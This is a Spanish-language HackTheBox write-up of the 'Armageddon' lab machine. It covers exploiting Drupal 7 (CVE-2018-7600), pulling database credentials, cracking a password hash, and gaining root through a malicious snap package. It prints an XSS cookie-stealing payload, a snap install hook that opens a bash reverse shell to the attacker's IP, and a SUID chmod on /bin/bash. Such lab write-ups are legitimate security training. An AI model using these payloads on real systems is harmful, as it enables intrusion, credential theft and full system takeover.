---
layout      : post
title       : "HackTheBox - Armageddon"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323banner.png
category    : [ htb ]
tags        : [ drupal, snap ]
---
Máquina Linux nivel fácil. Jugaremos con **CVE**s, romperemos **Drupal7** para ejecutar comandos, las malas configuraciones se revelarán y finalmente nos aprovechamos de nuestros permisos para ejecutar un paquete **snap** malicioso y obtener el privesc.

![323armageddonHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323armageddonHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [bertolis](https://www.hackthebox.eu/profile/27897).

¡Bueno bueno, a darle pues!

Hola ;) en esta máquina inicialmente nos encontraremos con una versión de `Drupal 7` vulnerable a ejecucion remota de comandos, aprovecharemos esta brecha para obtener una **fake Shell** y que nos sea más fácil la enumeración... Enumerando encontraremos las credenciales del usuario de la base de datos, las usaremos para ver la data de la tabla `users`, en la cual existe el usuario **brucetherealadmin** (que es usuario del sistema), tomaremos su contraseña (hash) la crackearemos y probando con ella ante el servicio `SSH` logramos una sesión válida.

Finalmente validando nuestros permisos de ejecución como usuario **<u>root</u>**, vemos que podemos correr la instrucción `/usr/bin/snap install *`, usaremos esto para crearnos un paquete **snap** malicioso que nos permita al mismo tiempo de estar instalándose, una ejecución de comandos, en este caso al estar siendo ejecutada con permisos administrativos estaríamos ejecutándo cada comando como **root**. Usaremos esto para obtener una reverse Shell..

...

#### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Tirando a vulns conocidas pero tambien algo juguetona y poco real.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

¿Qué vamo a encontra'?

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Movimiento Lateral: Apache -> brucetherealadmin](#movimiento-lateral-bruce).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Empezaremos con un escaneo para conocer que puertos tiene abiertos la máquina:

```bash
❭ nmap -p- --open -v 10.10.10.233 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                                                                                  |
| --open    | Solo los puertos que están abiertos                                                                      |
| -v        | Permite ver en consola lo que va encontrando                                                             |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/Writeups/master/HTB/Magic/images/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |

```bash
❭ cat initScan 
# Nmap 7.91 scan initiated Tue Mar 30 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.233
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.233 ()   Status: Up
Host: 10.10.10.233 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Tue Mar 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 71.74 seconds
```

Perfecto, nos encontramos los servicios:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)** |
| 80     | **[HTTP](https://developer.mozilla.org/es/docs/Web/HTTP/Overview)** |

Ahora hagamos un escaneo de scripts y versiones para tener info más especifica de cada servicio encontrado:

```bash
❭ nmap -p 22,80 -sC -sV 10.10.10.233 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
❭ cat portScan 
# Nmap 7.91 scan initiated Tue Mar 30 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 18.08 seconds
```

Obtenemos (varias cositas que veremos despues) por ahora:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 |
| 80     | HTTP     | Apache httpd 2.4.6 |

Metámonos con cada servicio a ver por donde entrarle...

...

En cuanto al puerto **22** y su versión no tenemos nada.

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

![323page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323page80.png)

Tenemos un panel login, donde también podemos registrarnos... Antes de empezar a recorrer la página, creémonos una cuenta (o intentemos) a ver que hay dentro...

![323page80_error_register](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323page80_error_register.png)

El mensaje de error es medio interesante, ya que no nos va a dejar entrar :P Pero también habla de que nuestra cuenta esta a la espera de ser aprobada por un administrador... Con esto podríamos pensar en registrarnos con algún nombre tipo: 

```js
<script>document.write('<img src="http://<nuestra_ip>/cualquiercosita.jpg?cookie=' + document.cookie + '">')</script>
```

Levantaríamos un servidor web y lanzaríamos esa línea para que cuando el administrador valide nuestro usuario lográramos en teoría obtener su cookie, pero igual al intentarlo nos detecta los caracteres extraños y no nos deja registrarnos...

Podemos volver a nuestro escaneo de `nmap` y fijarnos que tenemos un `Drupal 7`, veamos si hay algunas vulnerabilidades relacionadas con él...

> **Drupal** es un gestor de contenidos, hecho para la publicacion pricnipalmente de articulos, que tambien permite generar foros, encuestas, blogs... [¿Qué es **Drupal**?](https://www.fullweb.es/blog/drupal-que-es-y-por-que-deberias-utilizarlo)

Bien, revisando la versión `7` que tenemos, nos encontramos un **CVE** bastante interesante...

* [**Advisory** Drupal 7.x and 8.x - RCE - affecting multiple subsystems with default or common module configurations](https://www.drupal.org/sa-core-2018-002).
* [**CVE-2018-7600** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows RCE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600).

Vale vale, malas configuraciones permiten ejecución remota de comandos, al parecer lo llaman **Drupalgeddon**, profundizando encontramos algunos recursos por si les quieren echar un ojo:

* [Drupalgeddon Attacks Continue on Sites Missing Security Updates (CVE-2018-7600, CVE-2018-7602)](https://es-la.tenable.com/blog/drupalgeddon-attacks-continue-on-sites-missing-security-updates-cve-2018-7600-cve-2018-7602).
* [Drupalgeddon Vulnerability - What is it? Are You Impacted? (ta lindo este)](https://blog.rapid7.com/2018/04/27/drupalgeddon-vulnerability-what-is-it-are-you-impacted/).
* [How **Drupalgeddon 2** works (guapetón)](https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/).

Ahora sí, veamos que exploits hay y como podemos aprovecharlos...

...

## Explotación [#](#explotacion) {#explotacion}

Nos encontramos bastantes, entre ellos destaqué 3, todos se aprovechan del envenenamiento del proceso al regenerar una contraseña para subir un archivo vía [AJAX](https://developer.mozilla.org/es/docs/Web/Guide/AJAX) y lograr `RCE`:

1. [Ruby - https://github.com/dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2), genera Fake Shell.
2. [Python3 - https://github.com/pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py), muestra salida limpia.
3. [Python3 - https://github.com/FireFart/CVE-2018-7600](https://github.com/FireFart/CVE-2018-7600), es el más fácil de leer, por lo tanto de entender que hace.

Claramente no tenemos una `Shell` aún, el primer recurso nos genera una Fake Shell, o sea que simula como si estuviéramos en una, pero no, el claro ejemplo es si intentamos hacer `cd ..` no nos va a mover del directorio donde estamos. Así que simplemente está ejecutando los comandos y nos los muestra como si fuera una Shell...

Después de jugar con los 3 (y otros) nos damos cuenta de que la máquina no tiene `nc`, no nos deja ejecutar ninguna reverse Shell (ni con **Py**, ni **PHP**, ni **Perl**, ni **bash**, ni etc.), ya que obtenemos un lindo "permiso denegado". (O pues yo no pude :P)

Pasa lo mismo si intentamos usar `cURL` hacia nuestro archivo con contenido de `bash`... Así que la única opción es que debamos encontrar algo dentro de la máquina (podemos apoyarnos de le **FakeShell**) que nos permita después usar el puerto `22`...

![323bash_execCVEruby](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323bash_execCVEruby.png)

Ahora a enumerar...

...

## Apache -> brucetherealadmin [#](#movimiento-lateral-bruce) {#movimiento-lateral-bruce}

**(** 

Usando el otro exploit logramos ver que servicios hay localmente, ya que el de Ruby nos da `TimeOut` :(

```bash
❭ python3 CVE-2018-7600/drupa7-CVE-2018-7600.py http://10.10.10.233 -c "netstat -a"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
form--zYYkruK6jQ12BhgbrJrxrrszD0nEpeEs_2BURlHjsg
[*] Poisoned form ID: form--zYYkruK6jQ12BhgbrJrxrrszD0nEpeEs_2BURlHjsg
[*] Triggering exploit to execute: netstat -a

Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
...
```

**)**

Pero no nos enfocaremos en esto, sigamos enumerando...

No tenemos permisos para listar el directorio `/home`, pero podemos ver el archivo `/etc/passwd` y así saber que usuarios hay en el sistema:

```bash
armageddon.htb>> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
...
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

Perfecto, simplemente tenemos al usuario `brucetherealadmin` siendo relevante (que de ahora en adelante le diremos `bruce` :P), así que entiendo que debemos pivotear a él...

Dándole vueltas a los archivos que tenemos en el directorio `/var/www/html` nos encontramos uno con contenido llamativo:

```bash
armageddon.htb>> ls -la sites
total 12
drwxr-xr-x. 4 apache apache   75 Jun 21  2017 .
drwxr-xr-x. 9 apache apache 4096 Apr  1 01:35 ..
-rw-r--r--. 1 apache apache  904 Jun 21  2017 README.txt
drwxr-xr-x. 5 apache apache   52 Jun 21  2017 all
dr-xr-xr-x. 3 apache apache   67 Dec  3 12:30 default
-rw-r--r--. 1 apache apache 2365 Jun 21  2017 example.sites.php
armageddon.htb>> ls -la sites/default
total 56
dr-xr-xr-x. 3 apache apache    67 Dec  3 12:30 .
drwxr-xr-x. 4 apache apache    75 Jun 21  2017 ..
-rw-r--r--. 1 apache apache 26250 Jun 21  2017 default.settings.php
drwxrwxr-x. 3 apache apache    37 Dec  3 12:32 files
-r--r--r--. 1 apache apache 26565 Dec  3 12:32 settings.php
```

```bash
armageddon.htb>> cat sites/default/settings.php
```

```php
...
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
...
$drupal_hash_salt = '4S4JNzmn8lq4rqErTvcFlV4irAJoNqUmYy_d24JEyns';
...
```

Opa, las credenciales de un usuario de la base de datos y un `salt` llamativo, podemos probar esa contraseña contra el usuario `bruce` por medio de `SSH` a ver quee:

```bash
❭ ssh brucetherealadmin@10.10.10.233
brucetherealadmin@10.10.10.233's password: 
Permission denied, please try again.
```

Pero no, así que veamos si podemos usar las herramientas relacionadas con `mysql` y ver si dentro de la base de datos `drupal` hay algo que nos sirva contra `bruce`.

Probando `mysql` nos da error (al no tener una consola interactiva), podemos probar con [mysqlshow](https://www.thegeekstuff.com/2008/08/get-quick-info-on-mysql-db-table-column-and-index-using-mysqlshow/) para ver que bases de datos existen:

```bash
armageddon.htb>> mysqlshow -u drupaluser -p 
Enter password: mysqlshow: Access denied for user 'drupaluser'@'localhost' (using password: NO)
```

No nos permite ingresar la contraseña, pero en este caso haciendo una búsqueda rápida encontramos la solución en [Stack Overflow](https://stackoverflow.com/questions/12665522/is-there-a-way-to-pass-the-db-user-password-into-the-command-line-tool-mysqladmi#answer-12665543), simplemente juntamos la contraseña a la letra `-p` yyy:

```bash
armageddon.htb>> mysqlshow -u drupaluser -pCQHEy@9M*m23gBVj
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| drupal             |
| mysql              |
| performance_schema |
+--------------------+
```

Perfe, tenemos las bases de datos disponibles en el sistema... Y validamos que existe `drupal`. Ahora podemos empezar a meternos entre la base de datos y explorar las tablas:

```bash
armageddon.htb>> mysqlshow -u drupaluser -pCQHEy@9M*m23gBVj drupal
Database: drupal               
+-----------------------------+
|           Tables            |
+-----------------------------+
| actions                     |
| authmap                     |
...
| users                       |
...
| users_roles                 |
| variable                    |
| watchdog                    |
+-----------------------------+
```

Podemos ver cada tabla, pero veremos su estructura más no su contenido... Acá podemos apoyarnos de [mysqldump](https://www.sqlshack.com/how-to-backup-and-restore-mysql-databases-using-the-mysqldump-command/), el cual se encarga de generar un **backup** de la base de datos que le indiquemos, por lo tanto va a dumpear todo el contenido y la estructura de las tablas:

```bash
armageddon.htb>> mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupal
```

El output es gigante, peeeero como lo que nos interesa es validar el contenido de la tabla `users`, simplemente buscamos por eso:

```bash
armageddon.htb>> mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupal | grep "users"
...
CREATE TABLE `users` (
-- Dumping data for table `users`
...
```

```bash
armageddon.htb>> mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupal | grep "Dumping data for table \`users\`"
-- Dumping data for table `users`
armageddon.htb>> mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupal | grep "Dumping data for table \`users\`" -A 10
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (0,'','','','','',NULL,0,0,0,0,NULL,'',0,'',NULL),(1,'brucetherealadmin','$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt','admin@armageddon.eu','','','filtered_html',1606998756,1607077194,1607076276,1,'Europe/London','',0,'admin@armageddon.eu','a:1:{s:7:\"overlay\";i:1;}'),(3,'test','$S$DwIeAxnNRIh9nffiwqM.hpZpekF1HtLtbpHP1IvRoF7ASRB12D.4','test@gmail.com','','','filtered_html',1617249869,0,0,0,'Europe/London','',0,'test@gmail.com',NULL);
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
```

![323bash_ruEX_mysqldump_usersTable](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323bash_ruEX_mysqldump_usersTable.png)

Listos, vemos información útil sobre el usuario `bruce`, tenemos un `hash`, que según [los ejemplos de hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) de `hashcat` es de tipo `Drupal7`:

![323google_wiki_examples_drupalHash](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323google_wiki_examples_drupalHash.png)

Bien, entonces mediante `hashcat` o `john` podemos intentar crackear el hash, lo guardamos en un archivo y:

```bash
❭ cat hash_drupal_bruce 
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

```bash
❭ john --wordlist=/usr/share/wordlists/rockyou.txt hash_drupal_bruce 
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)
1g 0:00:00:02 DONE (2021-03-31 25:25) 0.4484g/s 104.0p/s 104.0c/s 104.0C/s courtney..harley
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

**booboo**, jmmm intentemos ahora con esa contraseña ante **SSH**:

![323bash_sshBruce_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323bash_sshBruce_done.png)

Listos, tamos dentro...

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando los permisos que tenemos, vemos algo interesante:

```bash
[brucetherealadmin@armageddon shm]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

Podemos ejecutar el binario `/usr/bin/snap` para instalar todo lo que tengamos en la ruta actual (`*`). Esto con permisos de administrador, o sea que cuando ejecutemos el proceso anterior, se estará ejecutando (si agregamos `sudo` al inicio) como **root**.

> **snap** podemos imaginarlo como **Docker** y las imagenes, donde ellas funcionan como un conjunto de de dependencias que conforman una aplicación. Esto mismo pasa con los paquetes `.snap`, nos permiten <<empaquetar>> una aplicación en un archivo (paquete realmente, solo que ya la repeti mucho :P).

* [**Snap** para instalar software en Linux](https://hipertextual.com/2018/12/snaps-instalar-software-linux).
* [https://es.wikipedia.org/wiki/Snap_(gestor_de_paquetes)](https://es.wikipedia.org/wiki/Snap_(gestor_de_paquetes)).

Bien, haciendo una búsqueda rápida sobre vulnerabilidades relacionadas nos encontramos una antigua, tiene su **CVE** e incluso exploits en **GitHub**:

* [cve.mitre.org - CVE-2019-7304](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7304).
* [https://github.com/initstring/dirty_sock](https://github.com/initstring/dirty_sock).

El problema básicamente viene de la **API** que implementa **snapd** en sus versiones menores a `2.37.1`, esto permitiendo conseguir ejecución de comandos en el sistema para obtener privesc... Pero validando nuestra versión de **snap** (`snap --version`) vemos que es mayor a la vulnerable e incluso probándolo (por los loles) el exploit nos indica que el sistema no es vulnerable. Les dejo el post que tiene una explicación excepcional de la vulnerabilidad por si le quieren echar un ojo:

* [Writeup - Linux Privilege Escalation via snapd (dirty_sock exploit)](https://initblog.com/2019/dirty-sock/).

¿Pero entonces para qué hacemos mención de esto? Bueno, si recordamos tenemos permisos de instalar paquetes `.snap` mediante **snap** (se repite, pero es necesario :P), el exploit en su estructura usa un paquete para la explotación, ya que al momento de estar instalando el `.snap`, se están ejecutando los comandos del atacante. En el mismo post hay un paso a paso para crear un paquete con el contenido malicioso, veamos:

<span style="color: red;">1. </span>Instalamos la herramienta que nos permite generar los paquetes.

```bash
sudo apt install snapcraft -y
o
sudo snap install snapcraft --classic
```

<span style="color: red;">2. </span>Creamos directorios de trabajo, esto para ser organizados :P

```bash
cd /tmp
mkdir dirty
cd dirty
```

<span style="color: red;">3. </span>Le indicamos que nos inicie el directorio actual como un proyecto snap.

```bash
snapcraft init
```

<span style="color: red;">4. </span>Preparamos el sitio donde guardaremos lo que será invocado cuando se esté instalando el paquete, también llamados **hooks**.

```bash
mkdir snap/hooks
touch snap/hooks/install
chmod a+x snap/hooks/install
```

> Additionally, snaps have something called "hooks". One such hook, the "install hook" is run at the time of snap installation and can be a simple shell script.
>> [https://initblog.com/2019/dirty-sock/](https://initblog.com/2019/dirty-sock/).

O sea que cuando estemos instalando el paquete, invocara el hook (:

<span style="color: red;">5. </span>Escribimos nuestro payload, el `"EOF"` simplemente le indica a `cat` cuando terminar de escribir el archivo `install`.

**Este y el paso 6 se pueden hacer simplemente abriendo el archivo con `nano`, `vim`, `vi`, etc. Pues por si algo**.

Inicialmente probaré a guardar el output del `id` del usuario que ejecuta la instalación, que si todo va bien debería ser **root** (: Esto como prueba inicial...

```bash
cat > snap/hooks/install << "EOF"
#!/bin/bash

id > /dev/shm/.id.txt
EOF
```

<span style="color: red;">6. </span>Configuramos el archivo `snapcraft.yaml`, la estructura de nuestro paquete.

```bash
cat > snap/snapcraft.yaml << "EOF"
name: dirty-sock
version: '0.1' 
summary: Como esssssssssssssssss
description: |
    Como seriaaaaaaaaaaaaa, como nos toqueeeeeeeeeee!

grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
EOF
```

<span style="color: red;">7. </span>Construimos finalmente el paquete.

```bash
snapcraft
```

Ahora que sabemos los pasos, procedamos a ejecutarlos...

Ejecutando el último paso nos da un error:

```bash
❭ snapcraft
This snapcraft project does not specify the base keyword, explicitly setting the base keyword enables the latest snapcraft features.
This project is best built on 'Ubuntu 16.04', but is building on a 'Parrot GNU/Linux 4.9' host.
Read more about bases at https://docs.snapcraft.io/t/base-snaps/11198
Sorry, an error occurred in Snapcraft:
Native builds aren't supported on Parrot GNU/Linux. You can however use 'snapcraft cleanbuild' with a container.
```

Si nos fijamos en el output (y recordamos en nuestro research sobre como crear paquetes en Linux) se habla de que va mucho mejor en **Ubuntu** y que en **Parrot OS** no tenemos las opciones nativas... Acá intenté jugar con las "soluciones" que nos daba el propio output y también [con estas maneras de build](https://snapcraft.io/docs/build-options) ofrecidas por una guía](https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy), pero nada, no conseguí construir el paquete.

* [Building a snap is easy](https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy).

Así que decidí probar a generarlo con una VM **Ubuntu** a ver si era problema mío o si está hecho exclusivamente para **Ubuntu** (aunque pueda que no sea ninguna de las dos opciones :P)... Haciendo el mismo proceso y llegando al último paso nos responde:

![323ubu_generating_snapFile_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323ubu_generating_snapFile_done.png)

Perfecto, se nos genera el archivo, lo pasamos a nuestra máquina de atacante, lo subimos a la máquina víctima e instalamos:

Nos ponemos es escucha mediante un servidor en **Python**:

```bash
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y ahora lo descargamos:

```bash
[brucetherealadmin@armageddon shm]$ curl http://10.10.14.164:8000/dirty-sock_0.1_amd64.snap -o dirty-sock_0.1_amd64.snap
[brucetherealadmin@armageddon shm]$ ls
dirty-sock_0.1_amd64.snap
[brucetherealadmin@armageddon shm]$ sudo /usr/bin/snap install *
error: cannot find signatures with metadata for snap "dirty-sock_0.1_amd64.snap"

# Le agregamos el parametro "--devmode" para que lo tome como "prueba"
[brucetherealadmin@armageddon shm]$ sudo /usr/bin/snap install * --devmode
dirty-sock 0.1 installed
```

Instalado, asi que validemos si se generó el archivo `.id.txt`:

```bash
[brucetherealadmin@armageddon shm]$ ls -la
total 8
drwxrwxrwt.  2 root              root                80 abr  6 16:27 .
drwxr-xr-x. 19 root              root              3100 abr  6 16:23 ..
-rw-rw-r--.  1 brucetherealadmin brucetherealadmin 4096 abr  6 16:26 dirty-sock_0.1_amd64.snap
-rw-r--r--.  1 root              root                89 abr  6 16:27 .id.txt
[brucetherealadmin@armageddon shm]$ cat .id.txt 
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
[brucetherealadmin@armageddon shm]$
```

Perfectooooooooooooooooooooooo, tenemos ejecución de comandos en el sistema como el usuario **root**... Ahora intentemos generar una reverse Shell y si no nos funciona también podemos intentar modificar los permisos del binario `/bin/bash` y agregarle que ahora sea `SUID`, para que nos dé una `bash` con respecto al usuario propietario sin problemas (o sea **root**)... Veamos:

Modificamos el archivo `install`:

```bash
❭ cat snap/hooks/install
#!/bin/bash

shred -zun 11 /dev/shm/.id.txt·
chmod 4755 /bin/bash·
bash -c "bash -i >& /dev/tcp/10.10.14.164/4433 0>&1"
```

Generamos el paquete:

![323ubu_generating_snapFile_revSH_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323ubu_generating_snapFile_revSH_done.png)

Y ahora lo subimos a la máquina. Nos ponemos en escucha (`nc -lvp 4433`) e instalamos:

![323bash_revSH_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323bash_revSH_done.png)

(Arriba se explotó o bueno, se queda abierto mientras tenemos la Shell ejecutando)

Ya somos **root** en el sistema, o sea podemos hacer lo que queramos :P

Peeeero también se supone que asignamos el permiso **SUID** al binario `/bin/bash`, echémosle un ojo y entendamos para qué lo hicimos.

> (Parece que entra en conflicto con la reverse shell, asi que mejor creemos un paquete que simplemente haga esa tarea)

```bash
❭ cat snap/hooks/install
#!/bin/bash

chmod 4755 /bin/bash·
```

Y al instalarlo:

```bash
[brucetherealadmin@armageddon shm]$ sudo /usr/bin/snap install * --devmode
error: cannot perform the following tasks:
- Run install hook of "dirty-sock" snap if present (run hook "install": chmod: changing permissions of '/bin/bash': Read-only file system)
```

F, no nos deja... Podríamos intentar con `/bin/sh`, pero no nos dejaría porque es un link hacia la `bash`:

```bash
[brucetherealadmin@armageddon shm]$ ls -la /bin/sh
lrwxrwxrwx. 1 root root 4 dic  3 09:35 /bin/sh -> bash
```

Pues nada, cambiando el permiso **SUID** del binario `/bin/bash` podríamos haberle indicado con la instrucción `/bin/bash -p` que ejecute la `bash` con respecto al usuario propietario del objeto, o sea **root**, pero no lo logramos. 

De igual forma ya tenemos una Reverse Shell como **root**, así que prácticamente tenemos todo (: Ahora solo nos quedaría ver las flags (:

![323flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323flags.png)

...

Hemo teminao'

Me gusto que el inicio tiró hacia la realidad (al ser un CVE), algunas malas configuraciones y finalmente el jugueteo con una vulnerabilidad conocida y real (CVE también) pero pensando lateralmente... Me gusto la máquina.

Y bueno, como siempre y como nunca, a seguir rompiendo todo y nos leeremos en algún sitio de la vida (: Gracias por pasarte...